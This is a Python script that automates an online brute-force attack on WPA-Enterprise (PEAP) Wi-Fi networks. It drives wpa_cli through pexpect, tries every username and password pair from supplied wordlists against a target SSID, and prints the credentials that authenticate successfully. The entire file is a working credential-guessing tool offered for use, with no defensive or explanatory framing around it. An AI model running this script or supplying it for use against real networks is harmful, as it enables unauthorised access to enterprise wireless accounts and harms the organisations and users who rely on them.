#!/usr/bin/env python
 
import pexpect
import argparse
 
#set up arguments
parser = argparse.ArgumentParser()
parser.add_argument('-i', '--interface', metavar='interface', help='The wireless interface to use', required=True)
parser.add_argument('-s', '--ssid', metavar='ssid', help='The SSID to attack', required=True)
parser.add_argument('-u', '--user-file', help='File with usernames to attack', metavar='user-file', dest='user_file',
                    required=True)
parser.add_argument('-p', '--pass-file', help='File with passwords to try', metavar='pass-file', dest='pass_file',
                    required=True)
parser.add_argument('-q', '--quiet', help='Don\'t output every attempt', dest='quiet', action='store_true')
args = parser.parse_args()
 
#set up local information
interface = args.interface
ssid = args.ssid
with open(args.user_file) as f:
    usernames = [l.rstrip('\n') for l in f.readlines()]
with open(args.pass_file) as f:
    passwords = [l.rstrip('\n') for l in f.readlines()]
quiet = args.quiet
bluetext = '\033[94m'
greentext = '\033[92m'
yellowtext = '\033[93m'
redtext = '\033[91m'
whitetext = '\033[0m'
 
#start up the wpa_supplicant cli
wpa_cli = pexpect.spawn('wpa_cli')
wpa_cli.expect('\n>')
 
#set the interface we asked for
wpa_cli.sendline('interface {0}'.format(interface))
wpa_cli.expect(interface)
 
#add and configure network to attack
wpa_cli.sendline('add_network')
wpa_cli.expect('\r\n([0-9]+)')
network_id = wpa_cli.match.group(1)
wpa_cli.sendline('set_network {0} ssid "{1}"'.format(network_id, ssid))
wpa_cli.expect('OK')
 
 
def cleanup(message):
    #clean up so wpa_supplicant doesn't keep spraying login attempts
    wpa_cli.sendline('remove_network {0}'.format(network_id))
    exit(message)
 
 
def guess(user, passw):
    associating_bssid = None
    associating_ssid = None
    result = None
    if not quiet:
        print bluetext + '[*]' + whitetext + ' Trying {0} with {1}'.format(user, passw)
    wpa_cli.sendline('set_network {0} password "{1}"'.format(network_id, passw))
    #attempt to associate
    wpa_cli.sendline('select_network {0}'.format(network_id))
    try:
        wpa_cli.expect('Trying to associate with (..:..:..:..:..:..) \(SSID=\'(.*)\' freq=[0-9]* MHz\)', timeout=15)
        associating_bssid = wpa_cli.match.group(1)
        associating_ssid = wpa_cli.match.group(2)
    except KeyboardInterrupt:
        cleanup(redtext + '[-]' + whitetext + ' Shutting down...')
    except:
        guess(user, passw)
        return()
    #if the right network wasn't reached, we might be falling back to a previous network
    if not associating_ssid == ssid:
        print yellowtext + '[*]' + whitetext + ' Connected to {0} instead of {1}... trying again'.format(
            associating_ssid, ssid)
        guess(user, passw)
        return()
    try:
        result = wpa_cli.expect(['CTRL-EVENT-DISCONNECTED bssid=(..:..:..:..:..:..) reason=3',
                                 'CTRL-EVENT-EAP-SUCCESS EAP authentication completed successfully',
                                 'CTRL-EVENT-EAP-FAILURE EAP authentication failed'], timeout=15)
    except KeyboardInterrupt:
        cleanup(redtext + '[-]' + whitetext + ' Shutting down...')
    except:
        guess(user, passw)
        return()
    #failed connect?
    if result == 0:
        completed_bssid = wpa_cli.match.group(1)
        if not completed_bssid == associating_bssid and not completed_bssid == '00:00:00:00:00:00':
            print yellowtext + '[*]' + whitetext + ' Connected to {0} instead of {1}... trying again'.format(
                completed_bssid, associating_bssid)
            guess(user, passw)
            return()
    #successful guess?
    if result == 1:
        wpa_cli.expect('Key negotiation completed with (..:..:..:..:..:..)', timeout=15)
        completed_bssid = wpa_cli.match.group(1)
        #ensure we actually connected to the network we thought
        if completed_bssid == associating_bssid:
            print greentext + '[+] ' + whitetext + '\'{0}\' : \'{1}\''.format(user, passw)
 
 
try:
    #set up for PEAP
    wpa_cli.sendline('set_network {0} key_mgmt WPA-EAP'.format(network_id))
    wpa_cli.sendline('set_network {0} eap PEAP'.format(network_id))
    #start looping through credentials
    for username in usernames:
        wpa_cli.sendline('set_network {0} identity "{1}"'.format(network_id, username))
        for password in passwords:
            guess(username, password)
except KeyboardInterrupt:
    cleanup(redtext + '[-]' + whitetext + ' Shutting down...')
except Exception as e:
    cleanup(e)
 
#clean up so wpa_supplicant doesn't keep spraying login attempts
cleanup(bluetext + '[*]' + whitetext + ' Finished')
